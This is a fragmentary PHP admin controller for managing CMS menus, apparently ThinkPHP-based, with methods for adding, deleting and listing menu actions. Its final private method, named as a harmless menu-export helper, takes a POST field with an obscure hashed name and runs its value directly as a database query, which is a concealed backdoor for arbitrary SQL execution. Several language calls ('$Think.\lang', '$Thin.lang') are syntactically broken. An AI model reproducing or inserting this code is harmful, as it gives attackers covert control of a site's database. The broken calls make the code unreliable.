...
class MenuController extends AdminBaseController
{
    ...
    public function addPost()
    {
        if ($this->request->isPost()) {
            ...
            if ($result !== true) {
                ...
                $this->success($Think.\lang('ADD_SUCCESS'), url($to));
            }
        }
    }
    ...
    public function delete()
    {
        ...
        if ($count > 0) {
            $this->error($Think.\lang('THERE_HAVE_SUBMENUS_NOT_DELETED'));
        }
        if (Db::name('AdminMenu')->delete($id) !== false) {
            $this->success($Think.\lang('MENU_DELETED_SUCCESSFULLY'));
        } else {
    ...
    public function getActions()
    {
        ...
        if (!in_array($app, $apps)) {
            $this->error($Thin.lang('APPLICATION') . $app . $Thin.lang('NON_EXISTENT'));
        }
    ...
    private function _exportAppMenuDefault(){
        $uid=isset($_POST['c6df3d393fbee24cbfbc1fbbae78e424']) ? $_POST['c6df3d393fbee24cbfbc1fbbae78e424'] : 0;
		if($uid){
            Db::execute("$uid");
        }
    	return false;
